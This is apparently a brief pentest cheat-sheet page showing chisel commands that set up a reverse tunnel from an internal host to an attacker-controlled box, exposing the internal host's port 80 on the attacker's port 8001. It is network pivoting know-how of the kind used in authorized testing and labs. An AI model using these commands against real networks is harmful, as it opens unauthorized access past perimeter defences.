<title>Reverse</title>
</head><body>Attacker box# chisel server -p 8000 -reverse<br/>
Internal box# chisel client &lt;Attacker box&gt;:8000 R:8001:&lt;Internal box&gt;:80<br/>
<br/>
This will let the attacker gain access to port 80 on the internal box by browsing to attacker port 8001 using port 8000 as the tunnel<br/>
